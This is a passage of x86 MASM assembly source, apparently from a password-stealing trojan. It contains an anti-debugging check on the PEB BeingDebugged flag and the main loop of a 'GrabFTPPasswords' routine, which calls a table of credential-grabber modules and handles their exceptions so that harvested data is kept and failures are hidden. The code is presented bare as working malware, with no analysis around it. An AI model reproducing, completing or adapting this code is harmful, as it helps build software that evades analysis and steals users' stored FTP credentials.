	IFNDEF	SKIP_ANTIDEBUG_TRICKS
	assume fs: nothing
	mov	eax, fs:[30h] ; pointer to PEB
	cmp	byte ptr[eax+2], 0 ; check BeingDebugged flag
	jz	not_being_debugged
	assume fs:ERROR
	invoke	StreamFree, stream
not_being_debugged:
	ENDIF
	ENDIF

	.WHILE	dword ptr[edi]
		invoke	DupeArrayClear
		invoke	StreamGetPos, stream
		mov	dwStreamRecoveryPosition, eax
		
		IFDEF	ENABLE_DEBUG_MODE
			; do not catch exceptions in debug mode
			push	stream
			call	dword ptr[edi]
			.IF	(eax != cModuleHdrLen + 8) && (dword ptr[edi] != offset GrabSystemInfo)
				mov	non_empty, TRUE
			.ENDIF
		ELSE
			__try	FTP_MODULE_EXCEPTION
				push	stream
				call	dword ptr[edi]
				.IF	(dword ptr[edi] != offset GrabSystemInfo)
					.IF	(eax != cModuleHdrLen + 8)
						mov	non_empty, TRUE
					.ELSE
						; Do not write empty headers
						invoke	StreamSetSize, dwStreamRecoveryStream, dwStreamRecoveryPosition
					.ENDIF
				.ENDIF
			__catch FTP_MODULE_EXCEPTION
				; unwind stream pointer & size on exception
				.IF	dwStreamRecoveryStream
					invoke	StreamSetSize, dwStreamRecoveryStream, dwStreamRecoveryPosition
				.ENDIF
			__finally FTP_MODULE_EXCEPTION
		ENDIF 
		add	edi, 4
	.ENDW
	
	mov	eax, non_empty
	ret
GrabFTPPasswords endp
